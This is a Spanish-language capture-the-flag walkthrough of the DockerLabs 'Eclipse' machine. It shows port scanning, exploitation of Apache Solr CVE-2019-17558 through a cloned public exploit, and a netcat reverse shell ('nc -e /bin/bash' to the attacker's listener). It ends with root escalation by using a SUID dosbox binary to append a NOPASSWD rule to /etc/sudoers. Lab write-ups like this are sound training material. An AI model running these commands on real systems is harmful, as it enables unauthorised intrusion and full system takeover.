# ECLIPSE - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Eclipse. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./eclipse.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: medio
- Sistema Operativo: linux
- Autor: Xerosec

## ESQEUMA

![eclipse](https://github.com/user-attachments/assets/420788af-e4aa-4cb0-9a52-495dabd0e523)

## ENUMERACIÓN

### conectividad y SO

Primero comprobamos la conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/a1179084-6908-4198-add6-afb29acdcaa5)

Recibimos respuesta, con TTL 64, por lo que la máquina seguramente use Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/866106fc-4051-4c44-b9ff-0ea4ac95c538)

#### puertos abiertos

**80 - TCP - HTTP**

**8983 - TCP - HTTP**

Ahora hacemos un escaneo de versiones y servicios sobre estos dos puertos:

```python
nmap -p80,8983 -sCV 172.17.0.2 -oN targeted
```

> `-p80,8983` hacer el escaneo solo sobre los puertos 80 y 8983

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/d4f5a1fe-6e64-4462-a842-8ac6f4877238)

### puerto 80

Ejecutamos `whatweb http://172.17.0.2` para ver las tecnologías que se están usando, pero no hay información interesante. Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/67c06121-a331-4a8d-acab-d692ec9f85df)

Solo hay esta imagen. No encontramos nada interesante en el código HTML ni haciendo esteganografía a la imagen. Tampoco encontramos nada haciendo fuzzing.

### puerto 8983

Ejecutamos `whatweb http://172.17.0.2:8983`. Se hace un redirect a `http://172.17.0.2:8983/solr`, el cual tiene de título "Solr Admin". Cargamos el puerto 8983 en el navegador:

![image](https://github.com/user-attachments/assets/d9323837-82f7-42db-b9a1-6429df4bf979)

Vemos un panel de administración, donde pone "Solr". Gracias a Google, sabemos que Apache Solr es un motor de búqueda de código abierto.

## EXPLOTACIÓN

En el panel podemos apreciar que pone "8.3.0", que parece la versión. Buscamos en Google "Apache Solr 8.3.0 vulnerabilities", y encontramos un [artículo](https://nvd.nist.gov/vuln/detail/cve-2019-17558) del NIST en el que se habla del CVE-2019-17558, una vulnerabilidad que tienen las versiones de Apache Solr desde la 5.0.0 hasta la 8.3.1, en la cual se pueden ejecutar comandos de forma remota en el servidor vulnerable, usando un parámetro llamado "VelocityResponseWriter".

Ahora que ya sabemos que vulnerabilidad presenta, buscamos exploits. Encontramos un [exploit](https://github.com/k8gege/SolrExp) escrito en python. Lo clonamos:

```python
git clone https://github.com/k8gege/SolrExp
```

E intentamos ejecutar el comando `id`:

```python
python2.7 exp.py http://172.17.0.2:8983 id
```

![image](https://github.com/user-attachments/assets/ad211c19-383c-408b-81f2-55d1b6fbbcb6)

Ganamos RCE. Si ejecutamos de forma remota `nc` a través del exploit, vemos que el programa se queda en espera, lo que indica que se está ejecutando netcat. Nos podemos aprovechar de esto para ganar acceso a la máquina.

Ejecutamos en local:

```python
nc -nlvp 443
```

Ejecutamos con el RCE:

```python
python2.7 exp.py http://172.17.0.2:8983 "nc -e /bin/bash 172.17.0.1 443"
```

![image](https://github.com/user-attachments/assets/2e9f95d7-3d24-4309-99ec-675ed713dc92)

Ganamos acceso como el usuario ninhack.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS

### root

Buscamos archivos con permisos SUID desde la raíz:

```python
find / -perm -4000 2>/dev/null
```

![image](https://github.com/user-attachments/assets/84b1a0be-5482-4641-8ec5-8bf78aec66a1)

Hay un binario que llama la atención: "dosbox". Buscamos en gtfobins y encontramos una [página](https://gtfobins.github.io/gtfobins/dosbox/) en la que se explica como escalar privilegios si este ejecutable tiene permisos SUID:

![image](https://github.com/user-attachments/assets/52e4c464-2d3b-454f-b7cb-1b6bbe77d664)

Para poder ejecutar cualquier comando como root, añadimos la línea "ninhack ALL = (ALL) NOPASSWD: ALL" al `/etc/sudoers`:

```python
dosbox -c "mount c /" -c "echo ninhack ALL = (ALL) NOPASSWD: ALL >>c:/etc/sudoers" -c exit
```

Una vez hecho, ejecutamos `sudo su`:

![image](https://github.com/user-attachments/assets/73a589a4-1a4c-4622-9e70-e26359104877)

Y ganamos una consola como root en la máquina Eclipse.